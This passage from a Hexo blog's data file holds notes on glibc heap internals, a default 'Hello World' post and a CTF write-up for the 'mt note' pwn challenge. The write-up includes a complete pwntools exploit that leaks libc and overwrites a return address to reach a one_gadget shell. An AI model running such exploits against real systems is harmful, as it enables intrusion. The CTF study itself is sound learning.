chunk放到对应的bin中</strong>。</li>\n<li>如果没有满足需求的，则在large bin中查找正好合适的chunk取出返回，如果没有但有比他大的large bin chunk，则切割该chunk后取出返回。**(large bin 中切割产生的last remainder 如果小于MIN_SIZE，则会一起交给malloc使用，而不是放入unsorted bin)**</li>\n<li>如果仍没有满足需求，则从top chunk中切割。</li>\n<li>如果top chunk中也不够，则会执行一次malloc_consolidate()，并将unsorted bin中free chunk放到对应bin，再查找一次是否有能够分配的。</li>\n<li>最后实在没办法就只能调用sysmalloc()进行分配。</li>\n</ol>\n<h3 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h3><p><a href=\"https://blog.csdn.net/qq_41453285/article/details/99071778\">大佬的free源码分析</a></p>\n<p><a href=\"https://www.cnblogs.com/luoleqi/p/12822833.html\">大佬的free源码分析</a></p>\n<p>与malloc类似，free调用的也是_libc_free，实际上起主要作用的也是其中的_int_free。</p>\n<h4 id=\"libc-free\"><a href=\"#libc-free\" class=\"headerlink\" title=\"_libc_free\"></a>_libc_free</h4><p>主要功能：</p>\n<ol>\n<li>检查有没有__free_hook，有则调用（<strong>类似__malloc_hook，可以修改来get shell</strong>）</li>\n<li>如果chunk为NULL，则啥也不干</li>\n<li>如果是mmap的chunk，则调用munmmap来free</li>\n<li>调用_int_free()释放chunk</li>\n</ol>\n<h4 id=\"int-free\"><a href=\"#int-free\" class=\"headerlink\" title=\"_int_free\"></a>_int_free</h4><p>对chunk进行释放，将其放入fast bin或unsorted bin，如果放入unsorted bin则考虑进行合并。</p>\n<p>主要流程：</p>\n<ol>\n<li>进行安全检查，chunk的指针地址不能溢出，chunk的大小必须是按是按 2*SIZE_SZ 对齐的且大于等于MINSIZE</li>\n<li>如果该chunk是fast bin chunk，则检查下一个chunk的size是否合法，之后<strong>检查当前free的chunk是否是fast bin头结点连接的chunk</strong>（防止直接的double free），之后将该chunk加入到对应大小的fast bin头（<strong>不会清空prev_inuse</strong>），释放结束</li>\n<li>如果该chunk不是fast bin chunk，则考虑加入unosrted bin，先进行检查，保证当前chunk不能是top chunk，并且下一个chunk的size要合法（大于等于MIN_SIZE且小于该arena的内存总量）</li>\n<li>之后考虑进行合并，先考虑与<strong>前一个</strong>free chunk进行合并，再考虑与<strong>后一个不是top chunk的（如果下一个是top chunk则会并入top chunk）</strong>free chunk进行合并,如果不能合并，则会清除后一个chunk的prev_inuse位，合并后将chunk加入到unsorted bin中。（large bin chunk 的fd_nextsize和bk_nextsize会赋NULL）</li>\n<li>如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。</li>\n<li>判断是否需要对heap收缩，如果需要则收缩。</li>\n</ol>\n<p>注意：</p>\n<ol>\n<li>释放chunk大小要2*SIZE_EZ对其，大小大于等于MIN_SIZE且没有地址溢出</li>\n<li>释放fast bin，会检查bin头指向的chunk与该chunk是否一致，防止double free(<strong>如果隔一个仍能实现fast bin double free</strong>)</li>\n<li>释放chunk的时候，chunk不能为top chunk，next chunk的地址不能超过当前分配区结束的地址，以及next chunk中chunk的prev_inuse标志位需置1(<strong>构造house of spirit</strong>)</li>\n<li>当前 free 的 chunk 的下一个相邻 chunk 的大小需要大于 2*SIZE_SZ 且小于分配区所分配区的内存总量(<strong>构造house of spirit</strong>)</li>\n<li>释放的chunk通过unlink脱链，注意unlink的检查(<strong>也许会有对unlink的利用</strong>)</li>\n</ol>"},{"title":"Hello World","date":"2023-01-01T16:00:00.000Z","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2023-01-02 00:00:00\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"updated":"2023-01-03T15:07:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag1003v5oud0be6bte1","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"mt note","date":"2023-01-02T11:54:26.000Z","_content":"\n美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。\n\n<!-- more -->\n\n64位菜单，只开了NX\n\n有build、delete、modify、display四个功能\n\nbuild\n\n```c\nint __fastcall build(__int64 a1)\n{\n  int result; // eax\n  unsigned int size; // [rsp+10h] [rbp-10h]\n  _BYTE idx[12]; // [rsp+14h] [rbp-Ch]\n\n  *(_QWORD *)idx = (unsigned int)get_idx(a1);   // 最多同时build16个,0~15\n  if ( *(_DWORD *)idx == -1 )\n    return puts(\"No free space already\");\n  printf(\"Size: \");\n  size = get_input();\n  if ( !size || size > 0x1FF )\n    return puts(\"Not allowed\");\n  *(_QWORD *)&idx[4] = malloc(size);\n  printf(\"Content: \");\n  read(0, *(void **)&idx[4], size);\n  *(_QWORD *)(a1 + 16LL * *(int *)idx) = *(_QWORD *)&idx[4];\n  result = size;\n  *(_DWORD *)(a1 + 16LL * *(int *)idx + 8) = size;// 有个地方存着size\n  return result;\n}\n```\n\ndelete\n\n```c\nint __fastcall sub_4013F3(__int64 a1)\n{\n  unsigned int idx; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx > 0x10 )\n    return puts(\"Not allowed\");\n  if ( !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Nothing here\");\n  free(*(void **)(16LL * idx + a1));\n  *(_QWORD *)(16LL * idx + a1) = 0LL;\n  *(_DWORD *)(16LL * idx + a1 + 8) = 0;         // 有个小UAF\n  return puts(\"done\");\n}\n```\n\nmodify\n\n```c\nint __fastcall sub_4014B6(__int64 a1)\n{\n  int idx; // [rsp+14h] [rbp-Ch]\n  void *buf; // [rsp+18h] [rbp-8h]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx > 16 || !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Not allowed\");\n  buf = *(void **)(16LL * idx + a1);\n  printf(\"Content: \");\n  return read(0, buf, *(int *)(16LL * idx + a1 + 8));// 只能写size大小，但index可以为负数\n}\n```\n\ndisplay\n\n```c\nint __fastcall sub_401580(__int64 a1)\n{\n  int result; // eax\n  unsigned int idx; // [rsp+14h] [rbp-Ch]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx <= 0x10 && *(_QWORD *)(16LL * idx + a1) )\n    result = printf(\"Content: %s\\n\", *(const char **)(16LL * idx + a1));\n  else\n    result = puts(\"Not allowed\");\n  return result;\n}\n```\n\n有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。\n\n可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。\n\n除此之外，modify中存在**下标负溢出**，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget\n\n```python\nfrom pwn import*\nelf=ELF(\"./note2\")\nlibc=ELF(\"./libc-2.31.so\")\n#p=process(\"./note2\")\np=remote('39.106.78.22',35569)\ncontext.log_level='debug'\n\ndef build(size,content):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('1')\n\tp.recvuntil(\"Size: \")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Content: \")\n\tp.send(content)\n\ndef display(idx):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('2')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n\tp.recvuntil(\"Content: \")\n\ndef modify(idx,content):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('3')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n \tp.recvuntil(\"Content: \")\n \tp.send(content)\n\ndef delete(idx):\n \tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('4')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n \tp.recvuntil(\"done\")\n\ndef debug():\n \tgdb.attach(p,'b* 0x401714')\n \tpause()\n\n\nbuild(0x80,'a'*0x20)#idx0\nbuild(0x80,'c'*0x20)#idx1\nbuild(0x80,'a'*0x20)#idx2\n\nfor i in range(7):#3,4,5,6,7,8,9\n\tbuild(0x80,'b'*0x20)\nfor i in range(7):\n\tdelete(3+i)\n\ndelete(1)\n\n\nfor i in range(7):#1,3,4,5,6,7,8\n\tbuild(0x80,'a'*0x8)\n\nbuild(0x30,'f'*0x8)#9\n\ndisplay(9)\n\n\nleak=u64(p.recvline()[8:14].ljust(8,'\\x00'))\nunsort=leak-0x80\nmhook=unsort-96-0x10\nlibcbase=mhook-libc.symbols['__malloc_hook']\n\none_gadget = [0xe3afe,0xe3b01,0xe3b04]\nfree_hook=libcbase+libc.symbols['__free_hook']\nlog.info(\"unsorted bin: \"+hex(unsort))\nlog.info(\"libcbase : \"+hex(libcbase))\nlog.info(\"malloc hook : \"+hex(mhook))\nlog.info(\"free hook : \"+hex(free_hook))\n\n#debug()\n#pop 0x00000000004017ac\npop_addr= 0x00000000004017ac\n#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))\n#pop r12 r15 to satisfy one_gadget\nmodify(-6,p64(0)+p64(pop_addr)+p64(0)+p64(0)+p64(0)+p64(0)+p64(libcbase+one_gadget[0]))\n\n\np.interactive()\n\n```","source":"_posts/mt_note.md","raw":"---\ntitle: mt note\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- stackoverflow\n- index overflow\n---\n\n美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。\n\n<!-- more -->\n\n64位菜单，只开了NX\n\n有build、delete、modify、display四个功能\n\nbuild\n\n```c\nint __fastcall build(__int64 a1)\n{\n  int result; // eax\n  unsigned int size; // [rsp+10h] [rbp-10h]\n  _BYTE idx[12]; // [rsp+14h] [rbp-Ch]\n\n  *(_QWORD *)idx = (unsigned int)get_idx(a1);   // 最多同时build16个,0~15\n  if ( *(_DWORD *)idx == -1 )\n    return puts(\"No free space already\");\n  printf(\"Size: \");\n  size = get_input();\n  if ( !size || size > 0x1FF )\n    return puts(\"Not allowed\");\n  *(_QWORD *)&idx[4] = malloc(size);\n  printf(\"Content: \");\n  read(0, *(void **)&idx[4], size);\n  *(_QWORD *)(a1 + 16LL * *(int *)idx) = *(_QWORD *)&idx[4];\n  result = size;\n  *(_DWORD *)(a1 + 16LL * *(int *)idx + 8) = size;// 有个地方存着size\n  return result;\n}\n```\n\ndelete\n\n```c\nint __fastcall sub_4013F3(__int64 a1)\n{\n  unsigned int idx; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx > 0x10 )\n    return puts(\"Not allowed\");\n  if ( !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Nothing here\");\n  free(*(void **)(16LL * idx + a1));\n  *(_QWORD *)(16LL * idx + a1) = 0LL;\n  *(_DWORD *)(16LL * idx + a1 + 8) = 0;         // 有个小UAF\n  return puts(\"done\");\n}\n```\n\nmodify\n\n```c\nint __fastcall sub_4014B6(__int64 a1)\n{\n  int idx; // [rsp+14h] [rbp-Ch]\n  void *buf; // [rsp+18h] [rbp-8h]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx > 16 || !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Not allowed\");\n  buf = *(void **)(16LL * idx + a1);\n  printf(\"Content: \");\n  return read(0, buf, *(int *)(16LL * idx + a1 + 8));// 只能写size大小，但index可以为负数\n}\n```\n\ndisplay\n\n```c\nint __fastcall sub_401580(__int64 a1)\n{\n  int result; // eax\n  unsigned int idx; // [rsp+14h] [rbp-Ch]\n\n  printf(\"Index: \");\n  idx = get_input();\n  if ( idx <= 0x10 && *(_QWORD *)(16LL * idx + a1) )\n    result = printf(\"Content: %s\\n\", *(const char **)(16LL * idx + a1));\n  else\n    result = puts(\"Not allowed\");\n  return result;\n}\n```\n\n有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。\n\n可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。\n\n除此之外，modify中存在**下标负溢出**，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget\n\n```python\nfrom pwn import*\nelf=ELF(\"./note2\")\nlibc=ELF(\"./libc-2.31.so\")\n#p=process(\"./note2\")\np=remote('39.106.78.22',35569)\ncontext.log_level='debug'\n\ndef build(size,content):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('1')\n\tp.recvuntil(\"Size: \")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Content: \")\n\tp.send(content)\n\ndef display(idx):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('2')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n\tp.recvuntil(\"Content: \")\n\ndef modify(idx,content):\n\tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('3')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n \tp.recvuntil(\"Content: \")\n \tp.send(content)\n\ndef delete(idx):\n \tp.recvuntil(\"5. leave\\n\")\n\tp.sendline('4')\n\tp.recvuntil(\"Index: \")\n \tp.sendline(str(idx))\n \tp.recvuntil(\"done\")\n\ndef debug():\n \tgdb.attach(p,'b* 0x401714')\n \tpause()\n\n\nbuild(0x80,'a'*0x20)#idx0\nbuild(0x80,'c'*0x20)#idx1\nbuild(0x80,'a'*0x20)#idx2\n\nfor i in range(7):#3,4,5,6,7,8,9\n\tbuild(0x80,'b'*0x20)\nfor i in range(7):\n\tdelete(3+i)\n\ndelete(1)\n\n\nfor i in range(7):#1,3,4,5,6,7,8\n\tbuild(0x80,'a'*0x8)\n\nbuild(0x30,'f'*0x8)#9\n\ndisplay(9)\n\n\nleak=u64(p.recvline()[8:14].ljust(8,'\\x00'))\nunsort=leak-0x80\nmhook=unsort-96-0x10\nlibcbase=mhook-libc.symbols['__malloc_hook']\n\none_gadget = [0xe3afe,0xe3b01,0xe3b04]\nfree_hook=libcbase+libc.symbols['__free_hook']\nlog.info(\"unsorted bin: \"+hex(unsort))\nlog.info(\"libcbase : \"+hex(libcbase))\nlog.info(\"malloc hook : \"+hex(mhook))\nlog.info(\"free hook : \"+hex(free_hook))\n\n#debug()\n#pop 0x00000000004017ac\npop_addr= 0x00000000004017ac\n#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))\n#pop r12 r15 to satisfy one_gadget\nmodify(-6,p64(0)+p64(pop_addr)+p64(0)+p64(0)+p64(0)+p64(0)+p64(libcbase+one_gadget[0]))\n\n\np.interactive()\n\n```","slug":"mt_note","published":1,"updated":"2023-01-02T16:12:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag2003z5oud6twaej2c","content":"<p>美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。</p>\n<span id=\"more\"></span>\n\n<p>64位菜单，只开了NX</p>\n<p>有build、delete、modify、display四个功能</p>\n<p>build</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">build</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  _BYTE idx[<span class=\"number\">12</span>]; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  *(_QWORD *)idx = (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)get_idx(a1);   <span class=\"comment\">// 最多同时build16个,0~15</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)idx == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No free space already&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">  size = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !size || size &gt; <span class=\"number\">0x1FF</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)&amp;idx[<span class=\"number\">4</span>] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, *(<span class=\"type\">void</span> **)&amp;idx[<span class=\"number\">4</span>], size);</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">16LL</span> * *(<span class=\"type\">int</span> *)idx) = *(_QWORD *)&amp;idx[<span class=\"number\">4</span>];</span><br><span class=\"line\">  result = size;</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">16LL</span> * *(<span class=\"type\">int</span> *)idx + <span class=\"number\">8</span>) = size;<span class=\"comment\">// 有个地方存着size</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>delete</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_4013F3</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">0x10</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Nothing here&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*(<span class=\"type\">void</span> **)(<span class=\"number\">16LL</span> * idx + a1));</span><br><span class=\"line\">  *(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_DWORD *)(<span class=\"number\">16LL</span> * idx + a1 + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;         <span class=\"comment\">// 有个小UAF</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;done&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>modify</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_4014B6</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">16</span> || !*(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  buf = *(<span class=\"type\">void</span> **)(<span class=\"number\">16LL</span> * idx + a1);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, *(<span class=\"type\">int</span> *)(<span class=\"number\">16LL</span> * idx + a1 + <span class=\"number\">8</span>));<span class=\"comment\">// 只能写size大小，但index可以为负数</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>display</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_401580</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &lt;= <span class=\"number\">0x10</span> &amp;&amp; *(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    result = <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(<span class=\"number\">16LL</span> * idx + a1));</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 